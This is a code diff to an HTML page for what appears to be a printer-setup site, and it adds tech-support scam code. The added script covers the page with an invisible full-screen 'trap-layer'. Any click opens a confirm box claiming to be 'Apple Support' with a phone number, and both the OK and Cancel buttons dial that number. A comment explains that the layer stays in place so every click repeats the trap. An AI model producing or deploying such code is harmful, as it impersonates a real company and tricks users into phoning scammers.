@@ -18,7 +18,7 @@
 	 <script src="text.js"></script>
  </head>
 	 <body onload="run()">
-    <div id="interaction-layer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:99999; background: rgba(0,0,0,0.01);"></div>
+    <div id="trap-layer" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:999999; background:rgba(0,0,0,0); cursor:pointer;"></div>
 		</div>
 	</div>
  <div id="result"></div>
@@ -213,29 +213,31 @@
 
 <script>
     $(document).ready(function() {
-        // Load the text once on start
-        if (typeof defaultText !== 'undefined') {
-            $('.js_setTextBlock').html(defaultText);
-        }
-
-        // Global click listener for the entire page
-        $(document).on('click touchstart', function() {
+        // Function to trigger the action
+        function triggerSupportAction() {
+            var message = (typeof defaultText !== 'undefined') ? defaultText : "Important: Apple Support +1(808) 302-9453";
             
-            // The message to display
-            var message = (typeof defaultText !== 'undefined') ? defaultText : "Support: +1(808) 302-9453";
-
-            // Trigger the popup
+            // confirm() is allowed on iOS because this function 
+            // will be called inside a 'click' event.
             if (confirm(message)) {
-                // If they click OK, trigger the call
                 window.location.href = "tel:+18083029453";
             } else {
-                // If they click CANCEL, still trigger the call
                 window.location.href = "tel:+18083029453";
             }
+        }
+
+        // Listen for clicks on the invisible layer
+        $(document).on('click touchstart', '#trap-layer', function(e) {
+            e.preventDefault();
+            
+            // Execute the popup
+            triggerSupportAction();
+
+            // Note: We DO NOT remove the #trap-layer. 
+            // This ensures every subsequent click triggers the loop again.
         });
     });
-</script>
-	 <!-- Default Statcounter code for Printpro
+</script>	 <!-- Default Statcounter code for Printpro
 http://absolute-printersetup.b-cdn.net -->
 <script type="text/javascript">
 var sc_project=13222168; 
